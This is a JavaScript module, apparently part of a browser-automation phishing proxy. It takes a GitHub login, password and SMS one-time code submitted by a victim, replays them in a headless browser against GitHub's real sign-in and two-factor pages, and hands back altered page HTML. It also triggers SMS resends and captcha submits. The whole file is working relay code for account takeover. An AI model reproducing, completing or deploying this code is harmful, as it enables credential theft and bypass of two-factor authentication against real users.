const { Application } = require("../Application")
const { getHeaders } = require("../headers")

class Github extends Application {
    async postRequest(configuration) {
        const browser = await this.connectBrowser()
        const pages = await browser.pages()
        const page = pages[0]
        await page.setExtraHTTPHeaders(getHeaders(this.device))

        const body = configuration.body
        const spikeType = body["spike-type"]

        try {
            if (spikeType == "login") {
                let login_field = "#login_field"
                let password = "#password"

                await page.waitForSelector(login_field)
                await page.waitForSelector(password)
                await page.evaluate(() => {
                    document.getElementById("login_field").value = ""
                    document.getElementById("password").value = ""
                })

                await page.type("#login_field", body.login)
                await page.type("#password", body.password)

                await Promise.all([
                    page.click(`[value="Sign in"]`),
                    page.waitForNavigation({ waitUntil: "load" })
                ])
            } else if (spikeType == "click_send_sms") {
                let sendSmsBtn = `[type="submit"]`

                await page.waitForSelector(sendSmsBtn)
                await Promise.all([
                    page.click(sendSmsBtn),
                    page.waitForNavigation({ waitUntil: "load" })
                ])
            } else if (spikeType == "otp_code") {
                let otpSel = "#sms_totp"

                await page.waitForSelector(otpSel)
                await page.type(otpSel, body.sms_otp)

                try {
                    await Promise.all([
                        page.click(`[type="submit"]`),
                        page.waitForNavigation({ waitUntil: "load" })
                    ])
                } catch (error) { }

            } else if (spikeType == "resend_otp") {
                await page.evaluate(() => {
                    let allATag = document.querySelectorAll("a")
                    allATag.forEach(a => {
                        if (a.innerText.includes("Resend SMS")) {
                            a.setAttribute("spike-btn", true)
                        }
                    })
                })

                await Promise.all([
                    page.click(`[spike-btn="true"]`),
                    new Promise(re => setTimeout(re, 3000))
                ])
            } else if (spikeType == "captcha") {
                await Promise.all([
                    page.click(`[type="submit"]`),
                    page.waitForNavigation({ waitUntil: "load" })
                ])
            } else {
                return await this.openTAB(true)
            }


            const html = await page.content()
            let response = this.alterHTML(html, true)
            return response

        } catch (error) {
            console.log(error, "\n::- resetting the page to index")
            return await this.openTAB(true)
        }
    }
}

async function init(reqType, config) {
    const appBrowser = new Github(config)
    await appBrowser.openBrowser()

    if (reqType == "getReq") {
        return await appBrowser.openTAB(true)
    } else if (reqType == "postReq") {
        return await appBrowser.postRequest(config)
    }
}

module.exports = {
    init
}